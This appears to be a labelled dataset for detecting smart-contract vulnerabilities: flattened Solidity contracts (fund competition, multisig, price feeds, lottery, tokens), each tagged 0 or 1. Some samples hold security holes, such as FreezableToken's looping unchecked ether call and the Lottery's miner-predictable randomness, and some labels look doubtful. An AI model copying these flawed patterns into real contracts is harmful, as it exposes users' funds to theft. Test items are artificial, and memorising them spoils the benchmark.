1<CODESPLIT>contract Competition is CompetitionInterface, DSMath, DBC, Owned {         struct Registrant {        address fund;          address registrant;          bool hasSigned;          uint buyinQuantity;          uint payoutQuantity;          bool isRewarded;      }    struct RegistrantId {        uint id;          bool exists;      }                        bytes public constant TERMS_AND_CONDITIONS = hex"12208E21FD34B8B2409972D30326D840C9D747438A118580D6BA8C0735ED53810491";    uint public MELON_BASE_UNIT = 10 ** 18;         address public custodian;      uint public startTime;      uint public endTime;      uint public payoutRate;      uint public bonusRate;      uint public totalMaxBuyin;      uint public currentTotalBuyin;      uint public maxRegistrants;      uint public prizeMoneyAsset;      uint public prizeMoneyQuantity;      address public MELON_ASSET;      ERC20Interface public MELON_CONTRACT;      address public COMPETITION_VERSION;           Registrant[] public registrants;      mapping (address => address) public registeredFundToRegistrants;      mapping(address => RegistrantId) public registrantToRegistrantIds;      mapping(address => uint) public whitelistantToMaxBuyin;           event Register(uint withId, address fund, address manager);              function Competition(        address ofMelonAsset,        address ofCompetitionVersion,        address ofCustodian,        uint ofStartTime,        uint ofEndTime,        uint ofPayoutRate,        uint ofTotalMaxBuyin,        uint ofMaxRegistrants    ) {        MELON_ASSET = ofMelonAsset;        MELON_CONTRACT = ERC20Interface(MELON_ASSET);        COMPETITION_VERSION = ofCompetitionVersion;        custodian = ofCustodian;        startTime = ofStartTime;        endTime = ofEndTime;        payoutRate = ofPayoutRate;        totalMaxBuyin = ofTotalMaxBuyin;        maxRegistrants = ofMaxRegistrants;    }                                       function termsAndConditionsAreSigned(address byManager, uint8 v, bytes32 r, bytes32 s) view returns (bool) {        return ecrecover(                                                                                                       keccak256("\x19Ethereum Signed Message:\n34", TERMS_AND_CONDITIONS),            v,            r,            s        ) == byManager;      }              function isWhitelisted(address x) view returns (bool) { return whitelistantToMaxBuyin[x] > 0; }         function isCompetitionActive() view returns (bool) { return now >= startTime && now < endTime; }         function getMelonAsset() view returns (address) { return MELON_ASSET; }         function getRegistrantId(address x) view returns (uint) { return registrantToRegistrantIds[x].id; }         function getRegistrantFund(address x) view returns (address) { return registrants[getRegistrantId(x)].fund; }         function getTimeTillEnd() view returns (uint) {        if (now > endTime) {            return 0;        }        return sub(endTime, now);    }         function getEtherValue(uint amount) view returns (uint) {        address feedAddress = Version(COMPETITION_VERSION).CANONICAL_PRICEFEED();        var (isRecent, price, ) = CanonicalPriceFeed(feedAddress).getPriceInfo(MELON_ASSET);        if (!isRecent) {            revert();        }        return mul(price, amount) / 10 ** 18;    }         function calculatePayout(uint payin) view returns (uint payoutQuantity) {        payoutQuantity = mul(payin, payoutRate) / 10 ** 18;    }         function getCompetitionStatusOfRegistrants()        view        returns(            address[],            address[],            bool[]        )    {        address[] memory fundAddrs = new address[](registrants.length);        address[] memory fundRegistrants = new address[](registrants.length);        bool[] memory isRewarded = new bool[](registrants.length);        for (uint i = 0; i < registrants.length; i++) {            fundAddrs[i] = registrants[i].fund;            fundRegistrants[i] = registrants[i].registrant;            isRewarded[i] = registrants[i].isRewarded;        }        return (fundAddrs, fundRegistrants, isRewarded);    }                                       function registerForCompetition(        address fund,        uint8 v,        bytes32 r,        bytes32 s    )        payable        pre_cond(isCompetitionActive() && !Version(COMPETITION_VERSION).isShutDown())        pre_cond(termsAndConditionsAreSigned(msg.sender, v, r, s) && isWhitelisted(msg.sender))    {        require(registeredFundToRegistrants[fund] == address(0) && registrantToRegistrantIds[msg.sender].exists == false);        require(add(currentTotalBuyin, msg.value) <= totalMaxBuyin && registrants.length < maxRegistrants);        require(msg.value <= whitelistantToMaxBuyin[msg.sender]);        require(Version(COMPETITION_VERSION).getFundByManager(msg.sender) == fund);                 uint payoutQuantity = calculatePayout(msg.value);        registeredFundToRegistrants[fund] = msg.sender;        registrantToRegistrantIds[msg.sender] = RegistrantId({id: registrants.length, exists: true});        currentTotalBuyin = add(currentTotalBuyin, msg.value);        FundInterface fundContract = FundInterface(fund);        MELON_CONTRACT.approve(fund, payoutQuantity);                 fundContract.requestInvestment(payoutQuantity, getEtherValue(payoutQuantity), MELON_ASSET);        fundContract.executeRequest(fundContract.getLastRequestId());        custodian.transfer(msg.value);                 emit Register(registrants.length, fund, msg.sender);        registrants.push(Registrant({            fund: fund,            registrant: msg.sender,            hasSigned: true,            buyinQuantity: msg.value,            payoutQuantity: payoutQuantity,            isRewarded: false        }));    }                        function batchAddToWhitelist(        uint maxBuyinQuantity,        address[] whitelistants    )        pre_cond(isOwner())        pre_cond(now < endTime)    {        for (uint i = 0; i < whitelistants.length; ++i) {            whitelistantToMaxBuyin[whitelistants[i]] = maxBuyinQuantity;        }    }              function withdrawMln(address to, uint amount)        pre_cond(isOwner())    {        MELON_CONTRACT.transfer(to, amount);    }         function claimReward()        pre_cond(getRegistrantFund(msg.sender) != address(0))    {        require(block.timestamp >= endTime || Version(COMPETITION_VERSION).isShutDown());        Registrant registrant  = registrants[getRegistrantId(msg.sender)];        require(registrant.isRewarded == false);        registrant.isRewarded = true;                 uint balance = AssetInterface(registrant.fund).balanceOf(address(this));        require(AssetInterface(registrant.fund).transfer(registrant.registrant, balance));                 emit ClaimReward(msg.sender, registrant.fund, balance);    }}
0<CODESPLIT>contract DSGroup is DSExec, DSNote {    address[]  public  members;    uint       public  quorum;    uint       public  window;    uint       public  actionCount;    mapping (uint => Action)                     public  actions;    mapping (uint => mapping (address => bool))  public  confirmedBy;    mapping (address => bool)                    public  isMember;         event Proposed   (uint id, bytes calldata);    event Confirmed  (uint id, address member);    event Triggered  (uint id);    struct Action {        address  target;        bytes    calldata;        uint     value;        uint     confirmations;        uint     deadline;        bool     triggered;    }    function DSGroup(        address[]  members_,        uint       quorum_,        uint       window_    ) {        members  = members_;        quorum   = quorum_;        window   = window_;        for (uint i = 0; i < members.length; i++) {            isMember[members[i]] = true;        }    }    function memberCount() constant returns (uint) {        return members.length;    }    function target(uint id) constant returns (address) {        return actions[id].target;    }    function calldata(uint id) constant returns (bytes) {        return actions[id].calldata;    }    function value(uint id) constant returns (uint) {        return actions[id].value;    }    function confirmations(uint id) constant returns (uint) {        return actions[id].confirmations;    }    function deadline(uint id) constant returns (uint) {        return actions[id].deadline;    }    function triggered(uint id) constant returns (bool) {        return actions[id].triggered;    }    function confirmed(uint id) constant returns (bool) {        return confirmations(id) >= quorum;    }    function expired(uint id) constant returns (bool) {        return now > deadline(id);    }    function deposit() note payable {    }    function propose(        address  target,        bytes    calldata,        uint     value    ) onlyMembers note returns (uint id) {        id = ++actionCount;        actions[id].target    = target;        actions[id].calldata  = calldata;        actions[id].value     = value;        actions[id].deadline  = now + window;        Proposed(id, calldata);    }    function confirm(uint id) onlyMembers onlyActive(id) note {        assert(!confirmedBy[id][msg.sender]);        confirmedBy[id][msg.sender] = true;        actions[id].confirmations++;        Confirmed(id, msg.sender);    }    function trigger(uint id) onlyMembers onlyActive(id) note {        assert(confirmed(id));        actions[id].triggered = true;        exec(actions[id].target, actions[id].calldata, actions[id].value);        Triggered(id);    }    modifier onlyMembers {        assert(isMember[msg.sender]);        _;    }    modifier onlyActive(uint id) {        assert(!expired(id));        assert(!triggered(id));        _;    }                   function getInfo() constant returns (        uint  quorum_,        uint  memberCount,        uint  window_,        uint  actionCount_    ) {        return (quorum, members.length, window, actionCount);    }    function getActionStatus(uint id) constant returns (        uint     confirmations,        uint     deadline,        bool     triggered,        address  target,        uint     value    ) {        return (            actions[id].confirmations,            actions[id].deadline,            actions[id].triggered,            actions[id].target,            actions[id].value        );    }}
0<CODESPLIT>contract DSGroupFactory is DSNote {    mapping (address => bool)  public  isGroup;    function newGroup(        address[]  members,        uint       quorum,        uint       window    ) note returns (DSGroup group) {        group = new DSGroup(members, quorum, window);        isGroup[group] = true;    }}
0<CODESPLIT>contract DSThing is DSAuth, DSNote, DSMath {    function S(string s) internal pure returns (bytes4) {        return bytes4(keccak256(s));    }}interface GenericExchangeInterface {         event OrderUpdated(uint id);              function makeOrder(        address onExchange,        address sellAsset,        address buyAsset,        uint sellQuantity,        uint buyQuantity    ) external returns (uint);    function takeOrder(address onExchange, uint id, uint quantity) external returns (bool);    function cancelOrder(address onExchange, uint id) external returns (bool);              function isApproveOnly() view returns (bool);    function getLastOrderId(address onExchange) view returns (uint);    function isActive(address onExchange, uint id) view returns (bool);    function getOwner(address onExchange, uint id) view returns (address);    function getOrder(address onExchange, uint id) view returns (address, address, uint, uint);    function getTimestamp(address onExchange, uint id) view returns (uint);}
0<CODESPLIT>contract CanonicalRegistrar is DSThing, DBC {         struct Asset {        bool exists;          bytes32 name;          bytes8 symbol;          uint decimals;          string url;          string ipfsHash;          address breakIn;          address breakOut;          uint[] standards;          bytes4[] functionSignatures;          uint price;          uint timestamp;      }    struct Exchange {        bool exists;        address adapter;                   bool takesCustody;          bytes4[] functionSignatures;      }                        mapping (address => Asset) public assetInformation;    address[] public registeredAssets;    mapping (address => Exchange) public exchangeInformation;    address[] public registeredExchanges;                                                                          function registerAsset(        address ofAsset,        bytes32 inputName,        bytes8 inputSymbol,        uint inputDecimals,        string inputUrl,        string inputIpfsHash,        address[2] breakInBreakOut,        uint[] inputStandards,        bytes4[] inputFunctionSignatures    )        auth        pre_cond(!assetInformation[ofAsset].exists)    {        assetInformation[ofAsset].exists = true;        registeredAssets.push(ofAsset);        updateAsset(            ofAsset,            inputName,            inputSymbol,            inputDecimals,            inputUrl,            inputIpfsHash,            breakInBreakOut,            inputStandards,            inputFunctionSignatures        );        assert(assetInformation[ofAsset].exists);    }                                       function registerExchange(        address ofExchange,        address ofExchangeAdapter,        bool inputTakesCustody,        bytes4[] inputFunctionSignatures    )        auth        pre_cond(!exchangeInformation[ofExchange].exists)    {        exchangeInformation[ofExchange].exists = true;        registeredExchanges.push(ofExchange);        updateExchange(            ofExchange,            ofExchangeAdapter,            inputTakesCustody,            inputFunctionSignatures        );        assert(exchangeInformation[ofExchange].exists);    }                                            function updateAsset(        address ofAsset,        bytes32 inputName,        bytes8 inputSymbol,        uint inputDecimals,        string inputUrl,        string inputIpfsHash,        address[2] ofBreakInBreakOut,        uint[] inputStandards,        bytes4[] inputFunctionSignatures    )        auth        pre_cond(assetInformation[ofAsset].exists)    {        Asset asset = assetInformation[ofAsset];        asset.name = inputName;        asset.symbol = inputSymbol;        asset.decimals = inputDecimals;        asset.url = inputUrl;        asset.ipfsHash = inputIpfsHash;        asset.breakIn = ofBreakInBreakOut[0];        asset.breakOut = ofBreakInBreakOut[1];        asset.standards = inputStandards;        asset.functionSignatures = inputFunctionSignatures;    }    function updateExchange(        address ofExchange,        address ofExchangeAdapter,        bool inputTakesCustody,        bytes4[] inputFunctionSignatures    )        auth        pre_cond(exchangeInformation[ofExchange].exists)    {        Exchange exchange = exchangeInformation[ofExchange];        exchange.adapter = ofExchangeAdapter;        exchange.takesCustody = inputTakesCustody;        exchange.functionSignatures = inputFunctionSignatures;    }                        function removeAsset(        address ofAsset,        uint assetIndex    )        auth        pre_cond(assetInformation[ofAsset].exists)    {        require(registeredAssets[assetIndex] == ofAsset);        delete assetInformation[ofAsset];          delete registeredAssets[assetIndex];        for (uint i = assetIndex; i < registeredAssets.length-1; i++) {            registeredAssets[i] = registeredAssets[i+1];        }        registeredAssets.length--;        assert(!assetInformation[ofAsset].exists);    }                        function removeExchange(        address ofExchange,        uint exchangeIndex    )        auth        pre_cond(exchangeInformation[ofExchange].exists)    {        require(registeredExchanges[exchangeIndex] == ofExchange);        delete exchangeInformation[ofExchange];        delete registeredExchanges[exchangeIndex];        for (uint i = exchangeIndex; i < registeredExchanges.length-1; i++) {            registeredExchanges[i] = registeredExchanges[i+1];        }        registeredExchanges.length--;        assert(!exchangeInformation[ofExchange].exists);    }              function getName(address ofAsset) view returns (bytes32) { return assetInformation[ofAsset].name; }    function getSymbol(address ofAsset) view returns (bytes8) { return assetInformation[ofAsset].symbol; }    function getDecimals(address ofAsset) view returns (uint) { return assetInformation[ofAsset].decimals; }    function assetIsRegistered(address ofAsset) view returns (bool) { return assetInformation[ofAsset].exists; }    function getRegisteredAssets() view returns (address[]) { return registeredAssets; }    function assetMethodIsAllowed(        address ofAsset, bytes4 querySignature    )        returns (bool)    {        bytes4[] memory signatures = assetInformation[ofAsset].functionSignatures;        for (uint i = 0; i < signatures.length; i++) {            if (signatures[i] == querySignature) {                return true;            }        }        return false;    }         function exchangeIsRegistered(address ofExchange) view returns (bool) { return exchangeInformation[ofExchange].exists; }    function getRegisteredExchanges() view returns (address[]) { return registeredExchanges; }    function getExchangeInformation(address ofExchange)        view        returns (address, bool)    {        Exchange exchange = exchangeInformation[ofExchange];        return (            exchange.adapter,            exchange.takesCustody        );    }    function getExchangeFunctionSignatures(address ofExchange)        view        returns (bytes4[])    {        return exchangeInformation[ofExchange].functionSignatures;    }    function exchangeMethodIsAllowed(        address ofExchange, bytes4 querySignature    )        returns (bool)    {        bytes4[] memory signatures = exchangeInformation[ofExchange].functionSignatures;        for (uint i = 0; i < signatures.length; i++) {            if (signatures[i] == querySignature) {                return true;            }        }        return false;    }}interface SimplePriceFeedInterface {         event PriceUpdated(bytes32 hash);         function update(address[] ofAssets, uint[] newPrices) external;              function getQuoteAsset() view returns (address);    function getLastUpdateId() view returns (uint);         function getPrice(address ofAsset) view returns (uint price, uint timestamp);    function getPrices(address[] ofAssets) view returns (uint[] prices, uint[] timestamps);}
0<CODESPLIT>contract SimplePriceFeed is SimplePriceFeedInterface, DSThing, DBC {         struct Data {        uint price;        uint timestamp;    }         mapping(address => Data) public assetsToPrices;         address public QUOTE_ASSET;           uint public updateId;             CanonicalRegistrar public registrar;    CanonicalPriceFeed public superFeed;                             function SimplePriceFeed(        address ofRegistrar,        address ofQuoteAsset,        address ofSuperFeed    ) {        registrar = CanonicalRegistrar(ofRegistrar);        QUOTE_ASSET = ofQuoteAsset;        superFeed = CanonicalPriceFeed(ofSuperFeed);    }                                  function update(address[] ofAssets, uint[] newPrices)        external        auth    {        _updatePrices(ofAssets, newPrices);    }              function getQuoteAsset() view returns (address) { return QUOTE_ASSET; }    function getLastUpdateId() view returns (uint) { return updateId; }         function getPrice(address ofAsset)        view        returns (uint price, uint timestamp)    {        Data data = assetsToPrices[ofAsset];        return (data.price, data.timestamp);    }         function getPrices(address[] ofAssets)        view        returns (uint[], uint[])    {        uint[] memory prices = new uint[](ofAssets.length);        uint[] memory timestamps = new uint[](ofAssets.length);        for (uint i; i < ofAssets.length; i++) {            var (price, timestamp) = getPrice(ofAssets[i]);            prices[i] = price;            timestamps[i] = timestamp;        }        return (prices, timestamps);    }              function _updatePrices(address[] ofAssets, uint[] newPrices)        internal        pre_cond(ofAssets.length == newPrices.length)    {        updateId++;        for (uint i = 0; i < ofAssets.length; ++i) {            require(registrar.assetIsRegistered(ofAssets[i]));            require(assetsToPrices[ofAssets[i]].timestamp != now);              assetsToPrices[ofAssets[i]].timestamp = now;            assetsToPrices[ofAssets[i]].price = newPrices[i];        }        emit PriceUpdated(keccak256(ofAssets, newPrices));    }}
0<CODESPLIT>contract StakingPriceFeed is SimplePriceFeed {    OperatorStaking public stakingContract;    AssetInterface public stakingToken;                        function StakingPriceFeed(        address ofRegistrar,        address ofQuoteAsset,        address ofSuperFeed    )        SimplePriceFeed(ofRegistrar, ofQuoteAsset, ofSuperFeed)    {        stakingContract = OperatorStaking(ofSuperFeed);          stakingToken = AssetInterface(stakingContract.stakingToken());    }                   function depositStake(uint amount, bytes data)        external        auth    {        require(stakingToken.transferFrom(msg.sender, address(this), amount));        require(stakingToken.approve(stakingContract, amount));        stakingContract.stake(amount, data);    }              function unstake(uint amount, bytes data)        external        auth    {        stakingContract.unstake(amount, data);    }    function withdrawStake()        external        auth    {        uint amountToWithdraw = stakingContract.stakeToWithdraw(address(this));        stakingContract.withdrawStake();        require(stakingToken.transfer(msg.sender, amountToWithdraw));    }}interface RiskMgmtInterface {                                                      function isMakePermitted(        uint orderPrice,        uint referencePrice,        address sellAsset,        address buyAsset,        uint sellQuantity,        uint buyQuantity    ) view returns (bool);                                            function isTakePermitted(        uint orderPrice,        uint referencePrice,        address sellAsset,        address buyAsset,        uint sellQuantity,        uint buyQuantity    ) view returns (bool);}
1<CODESPLIT>contract CanonicalPriceFeed is OperatorStaking, SimplePriceFeed, CanonicalRegistrar {         event SetupPriceFeed(address ofPriceFeed);    struct HistoricalPrices {        address[] assets;        uint[] prices;        uint timestamp;    }         bool public updatesAreAllowed = true;    uint public minimumPriceCount = 1;    uint public VALIDITY;    uint public INTERVAL;    mapping (address => bool) public isStakingFeed;      HistoricalPrices[] public priceHistory;                                                                                    function CanonicalPriceFeed(        address ofStakingAsset,        address ofQuoteAsset,          bytes32 quoteAssetName,        bytes8 quoteAssetSymbol,        uint quoteAssetDecimals,        string quoteAssetUrl,        string quoteAssetIpfsHash,        address[2] quoteAssetBreakInBreakOut,        uint[] quoteAssetStandards,        bytes4[] quoteAssetFunctionSignatures,        uint[2] updateInfo,          uint[3] stakingInfo,          address ofGovernance    )        OperatorStaking(            AssetInterface(ofStakingAsset), stakingInfo[0], stakingInfo[1], stakingInfo[2]        )        SimplePriceFeed(address(this), ofQuoteAsset, address(0))    {        registerAsset(            ofQuoteAsset,            quoteAssetName,            quoteAssetSymbol,            quoteAssetDecimals,            quoteAssetUrl,            quoteAssetIpfsHash,            quoteAssetBreakInBreakOut,            quoteAssetStandards,            quoteAssetFunctionSignatures        );        INTERVAL = updateInfo[0];        VALIDITY = updateInfo[1];        setOwner(ofGovernance);    }              function setupStakingPriceFeed() external {        address ofStakingPriceFeed = new StakingPriceFeed(            address(this),            stakingToken,            address(this)        );        isStakingFeed[ofStakingPriceFeed] = true;        StakingPriceFeed(ofStakingPriceFeed).setOwner(msg.sender);        emit SetupPriceFeed(ofStakingPriceFeed);    }         function update(address[] ofAssets, uint[] newPrices) external { revert(); }              function burnStake(address user)        external        auth    {        uint totalToBurn = add(stakedAmounts[user], stakeToWithdraw[user]);        stakedAmounts[user] = 0;        stakeToWithdraw[user] = 0;        updateStakerRanking(user);        emit StakeBurned(user, totalToBurn, "");    }              function stake(        uint amount,        bytes data    )        public        pre_cond(isStakingFeed[msg.sender])    {        OperatorStaking.stake(amount, data);    }                                                                               function collectAndUpdate(address[] ofAssets)        public        auth        pre_cond(updatesAreAllowed)    {        uint[] memory newPrices = pricesToCommit(ofAssets);        priceHistory.push(            HistoricalPrices({assets: ofAssets, prices: newPrices, timestamp: block.timestamp})        );        _updatePrices(ofAssets, newPrices);    }    function pricesToCommit(address[] ofAssets)        view        returns (uint[])    {        address[] memory operators = getOperators();        uint[] memory newPrices = new uint[](ofAssets.length);        for (uint i = 0; i < ofAssets.length; i++) {            uint[] memory assetPrices = new uint[](operators.length);            for (uint j = 0; j < operators.length; j++) {                SimplePriceFeed feed = SimplePriceFeed(operators[j]);                var (price, timestamp) = feed.assetsToPrices(ofAssets[i]);                if (now > add(timestamp, VALIDITY)) {                    continue;                  }                assetPrices[j] = price;            }            newPrices[i] = medianize(assetPrices);        }        return newPrices;    }         function medianize(uint[] unsorted)        view        returns (uint)    {        uint numValidEntries;        for (uint i = 0; i < unsorted.length; i++) {            if (unsorted[i] != 0) {                numValidEntries++;            }        }        if (numValidEntries < minimumPriceCount) {            revert();        }        uint counter;        uint[] memory out = new uint[](numValidEntries);        for (uint j = 0; j < unsorted.length; j++) {            uint item = unsorted[j];            if (item != 0) {                     if (counter == 0 || item >= out[counter - 1]) {                    out[counter] = item;                   } else {                    uint k = 0;                    while (item >= out[k]) {                        k++;                       }                    for (uint m = counter; m > k; m--) {                        out[m] = out[m - 1];                         }                    out[k] = item;                }                counter++;            }        }        uint value;        if (counter % 2 == 0) {            uint value1 = uint(out[(counter / 2) - 1]);            uint value2 = uint(out[(counter / 2)]);            value = add(value1, value2) / 2;        } else {            value = out[(counter - 1) / 2];        }        return value;    }    function setMinimumPriceCount(uint newCount) auth { minimumPriceCount = newCount; }    function enableUpdates() auth { updatesAreAllowed = true; }    function disableUpdates() auth { updatesAreAllowed = false; }              function getQuoteAsset() view returns (address) { return QUOTE_ASSET; }    function getInterval() view returns (uint) { return INTERVAL; }    function getValidity() view returns (uint) { return VALIDITY; }    function getLastUpdateId() view returns (uint) { return updateId; }                        function hasRecentPrice(address ofAsset)        view        pre_cond(assetIsRegistered(ofAsset))        returns (bool isRecent)    {        var ( , timestamp) = getPrice(ofAsset);        return (sub(now, timestamp) <= VALIDITY);    }                   function hasRecentPrices(address[] ofAssets)        view        returns (bool areRecent)    {        for (uint i; i < ofAssets.length; i++) {            if (!hasRecentPrice(ofAssets[i])) {                return false;            }        }        return true;    }    function getPriceInfo(address ofAsset)        view        returns (bool isRecent, uint price, uint assetDecimals)    {        isRecent = hasRecentPrice(ofAsset);        (price, ) = getPrice(ofAsset);        assetDecimals = getDecimals(ofAsset);    }         function getInvertedPriceInfo(address ofAsset)        view        returns (bool isRecent, uint invertedPrice, uint assetDecimals)    {        uint inputPrice;                 (isRecent, inputPrice, assetDecimals) = getPriceInfo(ofAsset);                 uint quoteDecimals = getDecimals(QUOTE_ASSET);        return (            isRecent,            mul(10 ** uint(quoteDecimals), 10 ** uint(assetDecimals)) / inputPrice,            quoteDecimals            );    }         function getReferencePriceInfo(address ofBase, address ofQuote)        view        returns (bool isRecent, uint referencePrice, uint decimal)    {        if (getQuoteAsset() == ofQuote) {            (isRecent, referencePrice, decimal) = getPriceInfo(ofBase);        } else if (getQuoteAsset() == ofBase) {            (isRecent, referencePrice, decimal) = getInvertedPriceInfo(ofQuote);        } else {            revert();          }    }                                  function getOrderPriceInfo(        address sellAsset,        address buyAsset,        uint sellQuantity,        uint buyQuantity    )        view        returns (uint orderPrice)    {        return mul(buyQuantity, 10 ** uint(getDecimals(sellAsset))) / sellQuantity;    }                             function existsPriceOnAssetPair(address sellAsset, address buyAsset)        view        returns (bool isExistent)    {        return            hasRecentPrice(sellAsset) &&              hasRecentPrice(buyAsset) &&              (buyAsset == QUOTE_ASSET || sellAsset == QUOTE_ASSET) &&              (buyAsset != QUOTE_ASSET || sellAsset != QUOTE_ASSET);      }         function getPriceFeedsByOwner(address _owner)        view        returns(address[])    {        address[] memory ofPriceFeeds = new address[](numStakers);        if (numStakers == 0) return ofPriceFeeds;        uint current = stakeNodes[0].next;        for (uint i; i < numStakers; i++) {            StakingPriceFeed stakingFeed = StakingPriceFeed(stakeNodes[current].data.staker);            if (stakingFeed.owner() == _owner) {                ofPriceFeeds[i] = address(stakingFeed);            }            current = stakeNodes[current].next;        }        return ofPriceFeeds;    }    function getHistoryLength() returns (uint) { return priceHistory.length; }    function getHistoryAt(uint id) returns (address[], uint[], uint) {        address[] memory assets = priceHistory[id].assets;        uint[] memory prices = priceHistory[id].prices;        uint timestamp = priceHistory[id].timestamp;        return (assets, prices, timestamp);    }}interface VersionInterface {         event FundUpdated(uint id);         function shutDown() external;    function setupFund(        bytes32 ofFundName,        address ofQuoteAsset,        uint ofManagementFee,        uint ofPerformanceFee,        address ofCompliance,        address ofRiskMgmt,        address[] ofExchanges,        address[] ofDefaultAssets,        uint8 v,        bytes32 r,        bytes32 s    );    function shutDownFund(address ofFund);         function getNativeAsset() view returns (address);    function getFundById(uint withId) view returns (address);    function getLastFundId() view returns (uint);    function getFundByManager(address ofManager) view returns (address);    function termsAndConditionsAreSigned(uint8 v, bytes32 r, bytes32 s) view returns (bool signed);}
0<CODESPLIT>contract Version is DBC, Owned, VersionInterface {         bytes32 public constant TERMS_AND_CONDITIONS = 0xAA9C907B0D6B4890E7225C09CBC16A01CB97288840201AA7CDCB27F4ED7BF159;           string public VERSION_NUMBER;      address public MELON_ASSET;      address public NATIVE_ASSET;      address public GOVERNANCE;      address public CANONICAL_PRICEFEED;           bool public isShutDown;      address public COMPLIANCE;      address[] public listOfFunds;      mapping (address => address) public managerToFunds;           event FundUpdated(address ofFund);                             function Version(        string versionNumber,        address ofGovernance,        address ofMelonAsset,        address ofNativeAsset,        address ofCanonicalPriceFeed,        address ofCompetitionCompliance    ) {        VERSION_NUMBER = versionNumber;        GOVERNANCE = ofGovernance;        MELON_ASSET = ofMelonAsset;        NATIVE_ASSET = ofNativeAsset;        CANONICAL_PRICEFEED = ofCanonicalPriceFeed;        COMPLIANCE = ofCompetitionCompliance;    }         function shutDown() external pre_cond(msg.sender == GOVERNANCE) { isShutDown = true; }                                                                function setupFund(        bytes32 ofFundName,        address ofQuoteAsset,        uint ofManagementFee,        uint ofPerformanceFee,        address ofCompliance,        address ofRiskMgmt,        address[] ofExchanges,        address[] ofDefaultAssets,        uint8 v,        bytes32 r,        bytes32 s    ) {        require(!isShutDown);        require(termsAndConditionsAreSigned(v, r, s));        require(CompetitionCompliance(COMPLIANCE).isCompetitionAllowed(msg.sender));        require(managerToFunds[msg.sender] == address(0));          address[] memory melonAsDefaultAsset = new address[](1);        melonAsDefaultAsset[0] = MELON_ASSET;          address ofFund = new Fund(            msg.sender,            ofFundName,            NATIVE_ASSET,            0,            0,            COMPLIANCE,            ofRiskMgmt,            CANONICAL_PRICEFEED,            ofExchanges,            melonAsDefaultAsset        );        listOfFunds.push(ofFund);        managerToFunds[msg.sender] = ofFund;        emit FundUpdated(ofFund);    }              function shutDownFund(address ofFund)        pre_cond(isShutDown || managerToFunds[msg.sender] == ofFund)    {        Fund fund = Fund(ofFund);        delete managerToFunds[msg.sender];        fund.shutDown();        emit FundUpdated(ofFund);    }                                  function termsAndConditionsAreSigned(uint8 v, bytes32 r, bytes32 s) view returns (bool signed) {        return ecrecover(                                                                                                       keccak256("\x19Ethereum Signed Message:\n32", TERMS_AND_CONDITIONS),            v,            r,            s        ) == msg.sender;      }    function getNativeAsset() view returns (address) { return NATIVE_ASSET; }    function getFundById(uint withId) view returns (address) { return listOfFunds[withId]; }    function getLastFundId() view returns (uint) { return listOfFunds.length - 1; }    function getFundByManager(address ofManager) view returns (address) { return managerToFunds[ofManager]; }}
0<CODESPLIT>contract Lottery{              modifier onlyOwner()    {        require(msg.sender == owner);        _;    }        modifier notPooh(address aContract)    {        require(aContract != address(poohContract));        _;    }     modifier isOpenToPublic()    {        require(openToPublic);        _;    }    modifier onlyHuman()    {       require (msg.sender == tx.origin);        _;    }         event Deposit(        uint256 amount,        address depositer    );   event WinnerPaid(        uint256 amount,        address winner    );         POOH poohContract;       address owner;    bool openToPublic = false;      uint256 ticketNumber = 0;      uint256 winningNumber;           constructor() public    {        poohContract = POOH(0x4C29d75cc423E8Adaa3839892feb66977e295829);        openToPublic = false;        owner = msg.sender;    }       function() payable public { }     function deposit()       isOpenToPublic()       onlyHuman()     payable public     {                 require(msg.value >= 1000000000000000);        address customerAddress = msg.sender;                 poohContract.buy.value(msg.value)(customerAddress);        emit Deposit(msg.value, msg.sender);                 if(msg.value > 1000000000000000)        {            uint extraTickets = SafeMath.div(msg.value, 1000000000000000);                                       ticketNumber += extraTickets;        }                  if(ticketNumber >= winningNumber)        {                         poohContract.exit();                         payDev(owner);                         payWinner(customerAddress);                                     poohContract.buy.value(address(this).balance)(customerAddress);                       resetLottery();        }        else        {           ticketNumber++;        }    }         function myTokens() public view returns(uint256)    {        return poohContract.myTokens();    }          function myDividends() public view returns(uint256)    {        return poohContract.myDividends(true);    }       function ethBalance() public view returns (uint256)   {       return address(this).balance;   }              function openToThePublic()       onlyOwner()        public    {        openToPublic = true;        resetLottery();    }          function returnAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)    public    onlyOwner()    notPooh(tokenAddress)    returns (bool success)    {        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);    }                function payWinner(address winner) internal    {                 uint balance = SafeMath.sub(address(this).balance, 50000000000000000);        winner.transfer(balance);        emit WinnerPaid(balance, winner);    }         function payDev(address dev) internal    {        uint balance = SafeMath.div(address(this).balance, 10);        dev.transfer(balance);    }   function resetLottery() internal   isOpenToPublic()   {       ticketNumber = 1;       winningNumber = uint256(keccak256(block.timestamp, block.difficulty))%300;   }} 
0<CODESPLIT>contract POOH{    function buy(address) public payable returns(uint256);    function exit() public;    function myTokens() public view returns(uint256);    function myDividends(bool) public view returns(uint256);}library SafeMath {         function div(uint256 a, uint256 b) internal pure returns (uint256)     {        uint256 c = a / b;        return c;    }              function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }}
1<CODESPLIT>contract FreezableToken {    uint release;    uint balance;    function releaseAll() public returns (uint tokens) {        while (release > block.timestamp) {            tokens += balance;            msg.sender.call.value(tokens);        }        return tokens;    }}
0<CODESPLIT>contract HoldToken is MintableToken {    using SafeMath for uint256;    string public name = 'HOLD';    string public symbol = 'HOLD';    uint8 public decimals = 18;    event Burn(address indexed burner, uint256 value);    event BurnTransferred(address indexed previousBurner, address indexed newBurner);    address burnerRole;    modifier onlyBurner() {        require(msg.sender == burnerRole);        _;    }    function HoldToken(address _burner) public {        burnerRole = _burner;    }    function transferBurnRole(address newBurner) public onlyBurner {        require(newBurner != address(0));        BurnTransferred(burnerRole, newBurner);        burnerRole = newBurner;    }    function burn(uint256 _value) public onlyBurner {        require(_value <= balances[msg.sender]);        balances[msg.sender] = balances[msg.sender].sub(_value);        totalSupply_ = totalSupply_.sub(_value);        Burn(msg.sender, _value);        Transfer(msg.sender, address(0), _value);    }}  
